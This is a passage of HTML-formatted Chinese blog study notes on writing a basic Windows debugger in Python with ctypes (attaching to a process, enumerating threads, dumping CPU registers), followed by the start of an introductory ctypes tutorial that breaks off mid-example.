class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] We have successfully launched the <span class="keyword">process</span>!</span><br><span class="line">[*] The <span class="keyword">Process</span> ID I have is: <span class="number">14732</span></span><br></pre></td></tr></table></figure><hr><h3 id="ctypes-附加进程调试："><a class="header-anchor" href="#ctypes-附加进程调试："></a>ctypes 附加进程调试：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> my_debugger</span><br><span class="line"></span><br><span class="line">debugger = my_debugger.debugger()</span><br><span class="line">pid = input(<span class="string">"Enter the PID of the process to attach to:"</span>)</span><br><span class="line">debugger.attach(int(pid))</span><br><span class="line">debugger.detach()</span><br></pre></td></tr></table></figure><p>用到了三个<code>API</code>函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">OpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwDesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL  bInheritHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwProcessId</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess" target="_blank" rel="noopener">具体文档在这里</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">DebugActiveProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwProcessId</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-debugactiveprocess" target="_blank" rel="noopener">具体文档在这里</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">DebugActiveProcessStop</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwProcessId</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-debugactiveprocessstop" target="_blank" rel="noopener">具体文档在这里</a></p><p>调用代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attach</span><span class="params">(self,pid)</span>:</span></span><br><span class="line">    </span><br><span class="line">    self.h_process = self.open_process(pid)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># We attempt to attach to the process</span></span><br><span class="line">    <span class="comment"># if this fails we exit the call</span></span><br><span class="line">    <span class="keyword">if</span> kernel32.DebugActiveProcess(pid):</span><br><span class="line">        self.debugger_active = <span class="literal">True</span></span><br><span class="line">        self.pid             = int(pid)                    </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[*] Unable to attach to the process."</span>)</span><br><span class="line">            </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open_process</span><span class="params">(self,pid)</span>:</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment"># PROCESS_ALL_ACCESS = 0x001F0FFF</span></span><br><span class="line">    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS,<span class="literal">False</span>,pid) </span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> h_process</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">detach</span><span class="params">(self)</span>:</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> kernel32.DebugActiveProcessStop(self.pid):</span><br><span class="line">        print(<span class="string">"[*] Finished debugging. Exiting..."</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"There was an error"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p><strong>这里踩了个坑：</strong></p><p>打开进程的时候，<code>OpenProcess</code>函数的返回值始终是零，后来查了文档发现是<code>dwDesiredAccess</code>这个参数的问题，这个参数申请了脚本对打开后的进程的权限，感觉调用失败很可能是Python脚本权限不够的原因，最后查了资料把<code>python.exe</code><strong>以管理员权限运行</strong>就可以了。</p><p><strong>但是这么做毫无疑问是危险的</strong>，我这里的python是为了实验专门装的32位python，不会在它上面运行其余代码，但是目前为止没有找到更好的提权方式。</p><p>运行成功之后就可以附加对应进程的代码，并进一步开始调试了。</p><p>笔记中的代码在这里下载：<a href="https://nostarch.com/download/ghpython_src.zip" target="_blank" rel="noopener">python灰帽编程随书代码</a></p><p>原书的代码是<code>python2</code>，我用的<code>python3</code>，<code>ctypes</code>库的用法区别不大，有疑问请阅读<code>ctypes</code>官方文档。</p><hr><h3 id="获取CPU寄存器的状态："><a class="header-anchor" href="#获取CPU寄存器的状态："></a>获取CPU寄存器的状态：</h3><p><strong>CPU寄存器的功能解释：</strong></p><table><thead><tr><th style="text-align:center">寄存器</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">EAX</td><td style="text-align:center">累加寄存器，除了用于存储函数的<br>返回值外也用于执行计算的操作。</td></tr><tr><td style="text-align:center">EBX</td><td style="text-align:center">唯一一个没有特殊用途的寄存器，它能够作为额外的数据储存器。</td></tr><tr><td style="text-align:center">ECX</td><td style="text-align:center">计数寄存器，用于循环操作。ECX 寄存器的计算<br>是向下而不是向上的（简单理解就是用于循环操作时是由大减到小的）。</td></tr><tr><td style="text-align:center">EDX</td><td style="text-align:center">数据寄存器，这个寄存器从本质上来说是<br>EAX 寄存器的延伸， 它辅助 EAX 完成更多复杂的计算操作像乘法和除法。</td></tr><tr><td style="text-align:center">ESI</td><td style="text-align:center">源操作数指针（source index），存储着输入的数据流的位置。</td></tr><tr><td style="text-align:center">EDI</td><td style="text-align:center">目的操作数指针（destination index）， 存储了计算结果存储的位置。</td></tr><tr><td style="text-align:center">ESP</td><td style="text-align:center">栈指针，指向栈顶，一般是函数返回地址。</td></tr><tr><td style="text-align:center">EBP</td><td style="text-align:center">栈指针，指向栈底。</td></tr><tr><td style="text-align:center">EIP</td><td style="text-align:center">存储将要执行的指令，指向当前CPU马上要执行的位置</td></tr></tbody></table><p>调试器要能够收集到CPU 的各个寄存器的状态，当异常发生的时候才能确定栈的状态，目前正在执行的指令是什么，以及其他一些非常有用的信息。</p><p>要实现这个目的，首先要获取被调试目标内部的线程句柄：</p><p>用到的<code>API</code>为<code>OpenThread()</code>:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">OpenThread</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwDesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL  bInheritHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwThreadId</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread" target="_blank" rel="noopener">具体文档在这里</a></p><hr><h3 id="枚举线程："><a class="header-anchor" href="#枚举线程："></a>枚举线程：</h3><p>线程是程序运行的最小单位，所以我们必须知道一个进程运行了多少个线程，有哪些线程，才能进一步分析程序的行为。首先的准备工作是创建进程快照，用到的<code>API</code>函数是<code>CreateToolhelp32Snapshot</code>:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateToolhelp32Snapshot</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD th32ProcessID</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot" target="_blank" rel="noopener">具体文档在这里</a></p><p>该函数调用成功后会返回一个快照对象的句柄，从而可以获得更多进程有关的数据。</p><p>枚举线程的函数如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">Thread32First</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE          hSnapshot,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPTHREADENTRY32 lpte</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>该函数返回进程中被发现的第一个线程的相关信息。</p><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32first" target="_blank" rel="noopener">具体文档在这里</a></p><p>需要注意的是这里传进去的参数<code>lpte</code>是一个<code>LPTHREADENTRY32</code>型的结构体，其定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">THREADENTRY32</span>&#123;</span></span><br><span class="line">DWORD dwSize;</span><br><span class="line">DWORD cntUsage;</span><br><span class="line">    DWORD th32ThreadID;</span><br><span class="line">    DWORD th32OwnerProcessID;</span><br><span class="line">    LONG tpBasePri;</span><br><span class="line">    LONG tpDeltaPri;</span><br><span class="line">    DWORD dwFlags;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>此外还有一个<code>API</code>函数<code>Thread32Next()</code>：</p><p>它的参数和<code>Thread32First()</code>一毛一样，顾名思义，这个函数会返回当前枚举的线程的下一个线程。</p><p>得到线程的句柄之后，就应该检索该线程的上下文语境了，用到的<code>API</code>函数分别是：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">GetThreadContext</span><span class="params">(<span class="comment">// 这个函数取值</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE    hThread,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCONTEXT lpContext</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">SetThreadContext</span><span class="params">(<span class="comment">// 这个函数修改值</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE        hThread,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">const</span> CONTEXT *lpContext</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext" target="_blank" rel="noopener">具体文档在这里</a></p><p><code>lpContext</code>结构定义：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CONTEXT</span> &#123;</span></span><br><span class="line">    DWORD ContextFlags;</span><br><span class="line">    DWORD Dr0;</span><br><span class="line">    DWORD Dr1;</span><br><span class="line">    DWORD Dr2;</span><br><span class="line">    DWORD Dr3;</span><br><span class="line">    DWORD Dr6;</span><br><span class="line">    DWORD Dr7;</span><br><span class="line">    FLOATING_SAVE_AREA FloatSave;</span><br><span class="line">    DWORD SegGs;</span><br><span class="line">    DWORD SegFs;</span><br><span class="line">    DWORD SegEs;</span><br><span class="line">    DWORD SegDs;</span><br><span class="line">    DWORD Edi;</span><br><span class="line">    DWORD Esi;</span><br><span class="line">    DWORD Ebx;</span><br><span class="line">    DWORD Edx;</span><br><span class="line">    DWORD Ecx;</span><br><span class="line">    DWORD Eax;</span><br><span class="line">    DWORD Ebp;</span><br><span class="line">    DWORD Eip;</span><br><span class="line">    DWORD SegCs;</span><br><span class="line">    DWORD EFlags;</span><br><span class="line">    DWORD Esp;</span><br><span class="line">    DWORD SegSs;</span><br><span class="line">    BYTE ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ohhhhhhhhh，心心念念的寄存器终于出现了。没错，需要获取寄存器的值，这个结构体相当关键，最终的操作也反映在这两个函数上面。</p><p><strong>测试代码如下：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> my_debugger</span><br><span class="line"></span><br><span class="line">debugger = my_debugger.debugger()</span><br><span class="line">pid = input(<span class="string">"Enter the PID of the process to attach to:"</span>)</span><br><span class="line">debugger.attach(int(pid))</span><br><span class="line">list = debugger.enumerate_threads()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> thread <span class="keyword">in</span> list:</span><br><span class="line">    thread_context = debugger.get_thread_context(thread)</span><br><span class="line">    print(<span class="string">"[*] Dumping registers for thread ID: 0x%08x"</span> % thread)</span><br><span class="line">    print(<span class="string">"[**] EIP: 0x%08x"</span> % thread_context.Eip)</span><br><span class="line">    print(<span class="string">"[**] ESP: 0x%08x"</span> % thread_context.Esp)</span><br><span class="line">    print(<span class="string">"[**] EBP: 0x%08x"</span> % thread_context.Ebp)</span><br><span class="line">    print(<span class="string">"[**] EAX: 0x%08x"</span> % thread_context.Eax)</span><br><span class="line">    print(<span class="string">"[**] EBX: 0x%08x"</span> % thread_context.Ebx)</span><br><span class="line">    print(<span class="string">"[**] ECX: 0x%08x"</span> % thread_context.Ecx)</span><br><span class="line">    print(<span class="string">"[**] EDX: 0x%08x"</span> % thread_context.Edx)</span><br><span class="line">    print(<span class="string">"[*] END DUMP"</span>)</span><br><span class="line"></span><br><span class="line">debugger.detach()<span class="comment"># 调试完了要退出调试状态</span></span><br><span class="line">input(<span class="string">"Press any key exit."</span>)</span><br></pre></td></tr></table></figure><p>调用代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enumerate_threads</span><span class="params">(self)</span>:</span></span><br><span class="line">              </span><br><span class="line">    thread_entry     = THREADENTRY32()</span><br><span class="line">    thread_list      = []</span><br><span class="line">    snapshot         = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, self.pid)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> snapshot <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    </span><br><span class="line">        <span class="comment"># You have to set the size of the struct</span></span><br><span class="line">        <span class="comment"># or the call will fail</span></span><br><span class="line">        thread_entry.dwSize = sizeof(thread_entry)</span><br><span class="line">        success = kernel32.Thread32First(snapshot, byref(thread_entry))</span><br><span class="line">        <span class="keyword">while</span> success:</span><br><span class="line">            <span class="keyword">if</span> thread_entry.th32OwnerProcessID == self.pid:</span><br><span class="line">                thread_list.append(thread_entry.th32ThreadID)</span><br><span class="line"></span><br><span class="line">            success = kernel32.Thread32Next(snapshot, byref(thread_entry))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># No need to explain this call, it closes handles</span></span><br><span class="line">        <span class="comment"># so that we don't leak them.</span></span><br><span class="line">        kernel32.CloseHandle(snapshot)</span><br><span class="line">        <span class="keyword">return</span> thread_list</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_thread_context</span> <span class="params">(self, thread_id=None,h_thread=None)</span>:</span></span><br><span class="line">        </span><br><span class="line">    context = CONTEXT()</span><br><span class="line">    context.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Obtain a handle to the thread</span></span><br><span class="line">    <span class="keyword">if</span> h_thread <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        self.h_thread = self.open_thread(thread_id)</span><br><span class="line">                    </span><br><span class="line">    <span class="keyword">if</span> kernel32.GetThreadContext(self.h_thread, byref(context)):</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> context </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>这里以<code>WINDOWS核心编程</code>里的一个小demo作为被调试对象：</p><p>进程信息如下图：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/image-20200107193906049.png" alt="image-20200107193906049.png"></p><p><img src="http://sz.guiu.xyz/images/2020/02/25/image-20200107193819624.png" alt="image-20200107193819624.png"></p><p>运行结果：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Enter the PID of the <span class="keyword">process</span> to attach to:<span class="number">14168</span></span><br><span class="line">[*] Dumping registers <span class="keyword">for</span> thread ID: <span class="number">0</span>x0000036c</span><br><span class="line">[**] EIP: <span class="number">0</span>x75612c5c</span><br><span class="line">[**] ESP: <span class="number">0</span>x003efbd4</span><br><span class="line">[**] EBP: <span class="number">0</span>x003efc10</span><br><span class="line">[**] EAX: <span class="number">0</span>x00000000</span><br><span class="line">[**] EBX: <span class="number">0</span>x000c1126</span><br><span class="line">[**] ECX: <span class="number">0</span>x00000000</span><br><span class="line">[**] EDX: <span class="number">0</span>x00000000</span><br><span class="line">[*] <span class="keyword">END</span> DUMP</span><br><span class="line">[*] Dumping registers <span class="keyword">for</span> thread ID: <span class="number">0</span>x00004408</span><br><span class="line">[**] EIP: <span class="number">0</span>x77471cbc</span><br><span class="line">[**] ESP: <span class="number">0</span>x0485f9bc</span><br><span class="line">[**] EBP: <span class="number">0</span>x0485fa2c</span><br><span class="line">[**] EAX: <span class="number">0</span>x00000000</span><br><span class="line">[**] EBX: <span class="number">0</span>x76aa3dc0</span><br><span class="line">[**] ECX: <span class="number">0</span>x00000000</span><br><span class="line">[**] EDX: <span class="number">0</span>x00000000</span><br><span class="line">[*] <span class="keyword">END</span> DUMP</span><br><span class="line">[*] Dumping registers <span class="keyword">for</span> thread ID: <span class="number">0</span>x00000348</span><br><span class="line">[**] EIP: <span class="number">0</span>x77471cbc</span><br><span class="line">[**] ESP: <span class="number">0</span>x04a9fa04</span><br><span class="line">[**] EBP: <span class="number">0</span>x04a9fa74</span><br><span class="line">[**] EAX: <span class="number">0</span>x40000000</span><br><span class="line">[**] EBX: <span class="number">0</span>x76aa3de0</span><br><span class="line">[**] ECX: <span class="number">0</span>x00000000</span><br><span class="line">[**] EDX: <span class="number">0</span>x00000000</span><br><span class="line">[*] <span class="keyword">END</span> DUMP</span><br><span class="line">[*] Dumping registers <span class="keyword">for</span> thread ID: <span class="number">0</span>x00000ae0</span><br><span class="line">[**] EIP: <span class="number">0</span>x7747396c</span><br><span class="line">[**] ESP: <span class="number">0</span>x0438f6b8</span><br><span class="line">[**] EBP: <span class="number">0</span>x0438f870</span><br><span class="line">[**] EAX: <span class="number">0</span>x00000000</span><br><span class="line">[**] EBX: <span class="number">0</span>x03578b28</span><br><span class="line">[**] ECX: <span class="number">0</span>x00000000</span><br><span class="line">[**] EDX: <span class="number">0</span>x00000000</span><br><span class="line">[*] <span class="keyword">END</span> DUMP</span><br><span class="line">[*] Dumping registers <span class="keyword">for</span> thread ID: <span class="number">0</span>x000038fc</span><br><span class="line">[**] EIP: <span class="number">0</span>x7747396c</span><br><span class="line">[**] ESP: <span class="number">0</span>x0461fc2c</span><br><span class="line">[**] EBP: <span class="number">0</span>x0461fde4</span><br><span class="line">[**] EAX: <span class="number">0</span>x00000000</span><br><span class="line">[**] EBX: <span class="number">0</span>x032cf5a0</span><br><span class="line">[**] ECX: <span class="number">0</span>x00000000</span><br><span class="line">[**] EDX: <span class="number">0</span>x00000000</span><br><span class="line">[*] <span class="keyword">END</span> DUMP</span><br><span class="line">[*] Dumping registers <span class="keyword">for</span> thread ID: <span class="number">0</span>x00001478</span><br><span class="line">[**] EIP: <span class="number">0</span>x774741e0</span><br><span class="line">[**] ESP: <span class="number">0</span>x009afa58</span><br><span class="line">[**] EBP: <span class="number">0</span>x00000000</span><br><span class="line">[**] EAX: <span class="number">0</span>x774aab70</span><br><span class="line">[**] EBX: <span class="number">0</span>x00000000</span><br><span class="line">[**] ECX: <span class="number">0</span>x00000000</span><br><span class="line">[**] EDX: <span class="number">0</span>x00000000</span><br><span class="line">[*] <span class="keyword">END</span> DUMP</span><br><span class="line">[*] Finished debugging. Exiting...</span><br><span class="line">Press any key exit.</span><br></pre></td></tr></table></figure><p>基础处理函数到这部分就结束了，下一部分完成调试事件的处理函数。<code>p33</code></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 调试器 </tag>
            
            <tag> ctypes </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ctypes学习笔记一</title>
      <link href="/p/1df4e45f.html"/>
      <url>/p/1df4e45f.html</url>
      
        <content type="html"><![CDATA[<h1>ctypes学习笔记一</h1><h4 id="ctypes调用dll："><a class="header-anchor" href="#ctypes调用dll："></a>ctypes调用dll：</h4><p>python自带ctypes库，不用另外安装。</p><p>调用printf的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ctypes混合编程，由于gcc版本是32位，所以这里用32位的Python解释器（本机环境python3.8）</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">libc = CDLL(<span class="string">"./msvcrt.dll"</span>)</span><br><span class="line"></span><br><span class="line">message_string = <span class="string">b"Hello world\n"</span>       <span class="comment"># python3默认是Unicode编码，printf不支持</span></span><br><span class="line">libc.printf(<span class="string">b"%s"</span>, message_string)</span><br></pre></td></tr></table></figure><a id="more"></a><p>ctype与c++数据类型对应表：</p><table><thead><tr><th style="text-align:center">C Type</th><th style="text-align:center">Python Type</th><th style="text-align:center">ctypes Type</th></tr></thead><tbody><tr><td style="text-align:center">char</td><td style="text-align:center">1-character string</td><td style="text-align:center">c_char</td></tr><tr><td style="text-align:center">wchar_t</td><td style="text-align:center">1-character Unicode string</td><td style="text-align:center">c_wchar</td></tr><tr><td style="text-align:center">char</td><td style="text-align:center">int/long</td><td style="text-align:center">c_byte</td></tr><tr><td style="text-align:center">char</td><td style="text-align:center">int/long</td><td style="text-align:center">c_ubyte</td></tr><tr><td style="text-align:center">short</td><td style="text-align:center">int/long</td><td style="text-align:center">c_short</td></tr><tr><td style="text-align:center">unsigned short</td><td style="text-align:center">int/long</td><td style="text-align:center">c_ushort</td></tr><tr><td style="text-align:center">int</td><td style="text-align:center">int/long</td><td style="text-align:center">c_int</td></tr><tr><td style="text-align:center">unsigned int</td><td style="text-align:center">int/long</td><td style="text-align:center">c_uint</td></tr><tr><td style="text-align:center">long</td><td style="text-align:center">int/long</td><td style="text-align:center">c_long</td></tr><tr><td style="text-align:center">unsingned long</td><td style="text-align:center">int/long</td><td style="text-align:center">c_ulong</td></tr><tr><td style="text-align:center">unsigned long long</td><td style="text-align:center">int/long</td><td style="text-align:center">c_ulonglong</td></tr><tr><td style="text-align:center">long long</td><td style="text-align:center">int/long</td><td style="text-align:center">c_longlong</td></tr><tr><td style="text-align:center">float</td><td style="text-align:center">float</td><td style="text-align:center">c_float</td></tr><tr><td style="text-align:center">double</td><td style="text-align:center">float</td><td style="text-align:center">c_double</td></tr><tr><td style="text-align:center">chat * (NULL terminated)</td><td style="text-align:center">string or None</td><td style="text-align:center">c_char_p</td></tr><tr><td style="text-align:center">wchat_t * (NULL terminated)</td><td style="text-align:center">Unicode or None</td><td style="text-align:center">c_wchar_p</td></tr><tr><td style="text-align:center">void *</td><td style="text-align:center">int/long or None</td><td style="text-align:center">c_void_p</td></tr><tr><td style="text-align:center">c_bool</td><td style="text-align:center">_Bool</td><td style="text-align:center">bool (1)</td></tr></tbody></table><p>这里要注意编码的问题，python3默认是<code>Unicode</code>编码，所以这里对应的<code>c_char</code>字符串要换成<code>bytes</code>型：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">In</span> [<span class="number">2</span>]: c_char_p(<span class="string">"hello world."</span>)</span><br><span class="line">--------------------------------------------------------------------------         